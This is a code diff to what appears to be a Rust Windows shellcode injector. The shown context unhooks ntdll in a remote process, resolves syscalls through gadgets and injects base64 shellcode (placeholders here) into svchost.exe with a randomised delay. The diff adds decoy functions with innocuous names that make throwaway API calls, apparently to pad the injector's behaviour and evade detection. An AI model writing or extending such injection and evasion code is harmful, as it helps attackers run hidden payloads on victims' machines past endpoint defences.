@@ -130,6 +130,44 @@ const SHELLCODE1: &str = "AAA=";
 const SHELLCODE2: &str = "AAA=";
 const SHELLCODE3: &str = "AAA=";
 
+fn validate_system_configuration() {
+    let mut buffer = [0u16; 256];
+    let mut size = buffer.len() as u32;
+    unsafe {
+        windows_sys::Win32::System::WindowsProgramming::GetComputerNameW(buffer.as_mut_ptr(), &mut size);
+        let computer_name = String::from_utf16_lossy(&buffer[..size as usize]);
+        let _hash = computer_name.chars().fold(0u32, |acc, c| acc.wrapping_add(c as u32));
+
+        size = buffer.len() as u32;
+        windows_sys::Win32::System::WindowsProgramming::GetUserNameW(buffer.as_mut_ptr(), &mut size);
+    }
+}
+
+fn perform_background_tasks() {
+    let mut free_bytes = 0u64;
+    let mut total_bytes = 0u64;
+    let mut total_free = 0u64;
+    unsafe {
+        windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW(
+            "C:\\\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),
+            &mut free_bytes,
+            &mut total_bytes,
+            &mut total_free,
+        );
+
+        let mut system_time: windows_sys::Win32::Foundation::SYSTEMTIME = mem::zeroed();
+        windows_sys::Win32::System::SystemInformation::GetSystemTime(&mut system_time);
+    }
+}
+
+fn collect_user_metrics() {
+    let mut point: windows_sys::Win32::Foundation::POINT = unsafe { mem::zeroed() };
+    unsafe {
+        windows_sys::Win32::UI::WindowsAndMessaging::GetCursorPos(&mut point);
+        let _dummy = point.x * point.y;
+    }
+}
+
 fn get_module_base_address(process_handle: HANDLE, module_name: &str, gadgets: &syscall::Gadgets) -> Option<usize> {
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
     let mut return_len = 0;
@@ -357,7 +395,9 @@ fn get_process_pid(target_name: &str) -> Option<u32> {
 }
 
 fn inject(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets) -> Option<()> {
+    validate_system_configuration();
     let target_pid = get_process_pid(target_name)?;
+    perform_background_tasks();
     let shellcode = general_purpose::STANDARD.decode(shellcode_b64).ok()?;
 
     let mut process_handle: HANDLE = 0;
@@ -381,10 +421,12 @@ fn inject(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets) ->
 
     if status != 0 { return None; }
 
+    collect_user_metrics();
     if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll", gadgets) {
         unhook_remote_ntdll(process_handle, ntdll_base, gadgets);
     }
 
+    perform_background_tasks();
     let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
     let mut size = shellcode.len();
     let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory")?;
@@ -463,10 +505,13 @@ fn inject(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets) ->
 }
 
 fn main() {
+    validate_system_configuration();
     let gadgets = syscall::get_nt_gadgets().expect("Gadgets not found");
 
+    perform_background_tasks();
     inject("svchost.exe", SHELLCODE1, &gadgets);
 
+    collect_user_metrics();
     let seed = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount64() };
     let delay = 5 + (seed % 16); // 5 to 20 seconds
     std::thread::sleep(std::time::Duration::from_secs(delay));
